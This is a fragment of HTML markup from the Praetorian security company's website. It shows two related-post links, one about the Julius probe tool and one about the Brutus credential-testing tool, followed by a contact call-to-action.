data-widget_type="theme-post-title.default"> <h2 class="elementor-heading-title elementor-size-default"><a href="https://www.praetorian.com/blog/julius-update-from-17-to-33-probes-and-now-detecting-openclaw/">Julius Update: From 17 to 33 Probes (and Now Detecting OpenClaw)</a></h2> <a class="eael-wrapper-link-25de712 --eael-wrapper-link-tag" href="https://www.praetorian.com/blog/julius-update-from-17-to-33-probes-and-now-detecting-openclaw/" style="background: transparent; border: none; position: absolute; height: 100%; width: 100%; z-index: 9999; top: 0px; left: 0px;"></a></div> <div class="elementor-element elementor-element-d8430d4 elementor-hidden-desktop elementor-hidden-tablet elementor-hidden-mobile elementor-widget elementor-widget-button" data-id="d8430d4" data-element_type="widget" data-e-type="widget" data-widget_type="button.default"> <a class="elementor-button elementor-button-link elementor-size-sm" href="https://www.praetorian.com/blog/julius-update-from-17-to-33-probes-and-now-detecting-openclaw/"> <span class="elementor-button-content-wrapper"> <span class="elementor-button-icon"> <i aria-hidden="true" class="fas fa-chevron-right"></i> </span> <span class="elementor-button-text">Read More</span> </span> </a> </div> </div> <a class="eael-wrapper-link-03ccb64 --eael-wrapper-link-tag" href="https://www.praetorian.com/blog/julius-update-from-17-to-33-probes-and-now-detecting-openclaw/" style="background: transparent; border: none; position: absolute; height: 100%; width: 100%; z-index: 9999; top: 0px; left: 0px;"></a></div> </div> <link rel="stylesheet" href="https://www.praetorian.com/nitropack_static/hagxvXYfntuKaNjMvRDqzXJpjNGtEnoc/assets/static/optimized/rev-229a401/www.praetorian.com/combinedCss/nitro-min-noimport-dc2a92e9e94ea9ff6e063877eccb00fe-stylesheet.css"> <div data-elementor-type="loop-item" data-elementor-id="1992" class="elementor elementor-1992 e-loop-item e-loop-item-9311 post-9311 post type-post status-publish format-standard has-post-thumbnail hentry category-ai-security category-open-source-tools post_author-adam-crosser" data-elementor-post-type="elementor_library" data-custom-edit-handle="1"> <div data-eael-wrapper-link="eael-wrapper-link-03ccb64" data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-03ccb64 e-flex e-con-boxed e-con e-parent" data-id="03ccb64" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div class="e-con-inner"> <div class="elementor-element elementor-element-03832b4 elementor-absolute elementor-widget elementor-widget-post-info" data-id="03832b4" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_position&quot;:&quot;absolute&quot;}" data-widget_type="post-info.default"> <ul class="elementor-inline-items elementor-icon-list-items elementor-post-info"> <li class="elementor-icon-list-item elementor-repeater-item-e044213 elementor-inline-item" itemprop="about"> <span class="elementor-icon-list-text elementor-post-info__item elementor-post-info__item--type-terms"> <span class="elementor-post-info__terms-list"> <a href="https://www.praetorian.com/category/ai-security/" class="elementor-post-info__terms-list-item">AI Security</a>, <a href="https://www.praetorian.com/category/open-source-tools/" class="elementor-post-info__terms-list-item">Open Source Tools</a> </span> </span> </li> </ul> </div> <div class="elementor-element elementor-element-4ba8c0d elementor-widget elementor-widget-post-info" data-id="4ba8c0d" data-element_type="widget" data-e-type="widget" data-widget_type="post-info.default"> <ul class="elementor-inline-items elementor-icon-list-items elementor-post-info"> <li class="elementor-icon-list-item elementor-repeater-item-205ab6e elementor-inline-item" itemprop="datePublished"> <a href="https://www.praetorian.com/blog/2026/02/13/"> <span class="elementor-icon-list-text elementor-post-info__item elementor-post-info__item--type-date"> <time>February 13, 2026</time> </span> </a> </li> </ul> </div>  <div data-eael-wrapper-link="eael-wrapper-link-25de712" class="elementor-element elementor-element-25de712 elementor-widget elementor-widget-theme-post-title elementor-page-title elementor-widget-heading" data-id="25de712" data-element_type="widget" data-e-type="widget" data-widget_type="theme-post-title.default"> <h2 class="elementor-heading-title elementor-size-default"><a href="https://www.praetorian.com/blog/et-tu-default-creds-introducing-brutus-for-modern-credential-testing/">Et Tu, Default Creds? Introducing Brutus for Modern Credential Testing</a></h2> <a class="eael-wrapper-link-25de712 --eael-wrapper-link-tag" href="https://www.praetorian.com/blog/et-tu-default-creds-introducing-brutus-for-modern-credential-testing/" style="background: transparent; border: none; position: absolute; height: 100%; width: 100%; z-index: 9999; top: 0px; left: 0px;"></a></div> <div class="elementor-element elementor-element-d8430d4 elementor-hidden-desktop elementor-hidden-tablet elementor-hidden-mobile elementor-widget elementor-widget-button" data-id="d8430d4" data-element_type="widget" data-e-type="widget" data-widget_type="button.default"> <a class="elementor-button elementor-button-link elementor-size-sm" href="https://www.praetorian.com/blog/et-tu-default-creds-introducing-brutus-for-modern-credential-testing/"> <span class="elementor-button-content-wrapper"> <span class="elementor-button-icon"> <i aria-hidden="true" class="fas fa-chevron-right"></i> </span> <span class="elementor-button-text">Read More</span> </span> </a> </div> </div> <a class="eael-wrapper-link-03ccb64 --eael-wrapper-link-tag" href="https://www.praetorian.com/blog/et-tu-default-creds-introducing-brutus-for-modern-credential-testing/" style="background: transparent; border: none; position: absolute; height: 100%; width: 100%; z-index: 9999; top: 0px; left: 0px;"></a></div> </div> </div> </div> </div> </div> </div> </div> </section> </div> </div> </div> </div> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-e1a3d0d e-con-full e-flex e-con e-parent" data-id="e1a3d0d" data-element_type="container" data-e-type="container"> <div class="elementor-element elementor-element-bd61db3 elementor-widget__width-initial elementor-widget elementor-widget-shortcode" data-id="bd61db3" data-element_type="widget" data-e-type="widget" data-widget_type="shortcode.default"> <div class="elementor-shortcode"> <div data-elementor-type="container" data-elementor-id="2389" class="elementor elementor-2389" data-elementor-post-type="elementor_library"> <section data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-71d8ea90 e-flex e-con-boxed e-con e-parent" data-id="71d8ea90" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div class="e-con-inner"> <div class="elementor-element elementor-element-7119177d elementor-view-default elementor-widget elementor-widget-icon" data-id="7119177d" data-element_type="widget" data-e-type="widget" data-widget_type="icon.default"> <div class="elementor-icon-wrapper"> <div class="elementor-icon"> <i aria-hidden="true" class="fas fa-comment-dots"></i> </div> </div> </div> <div class="elementor-element elementor-element-495611d0 elementor-widget elementor-widget-heading" data-id="495611d0" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default"> <h2 class="elementor-heading-title elementor-size-default">Ready to Discuss Your Next Continuous Threat Exposure Management Initiative?</h2> </div> <div class="elementor-element elementor-element-5250030e elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="5250030e" data-element_type="widget" data-e-type="widget" data-widget_type="text-editor.default"> <p>Praetorian’s Offense Security Experts are Ready to Answer Your Questions</p> </div> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-59bf559f e-flex e-con-boxed e-con e-child" data-id="59bf559f" data-element_type="container" data-e-type="container"> <div class="e-con-inner"> <div class="elementor-element elementor-element-7011d6da elementor-align-right elementor-widget elementor-widget-button" data-id="7011d6da" data-element_type="widget" data-e-type="widget" data-widget_type="button.default"> <a class="elementor-button elementor-button-link elementor-size-sm" href="https://www.praetorian.com/contact-us/"> <span class="elementor-button-content-wrapper"> <span class="elementor-button-icon"> <i aria-hidden="true" class="fas fa-chevron-right"></i> </span> <span class="elementor-button-text">Get Started</span> </span> </a> </div> </div> </div> </div> </section> </div> </div> </div> </div> </div>                       <span id="elementor-device-mode" class="elementor-screen-only"></span>             <svg style="display: none;" class="e-font-icon-svg-symbols"></svg>    <div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div></body></html>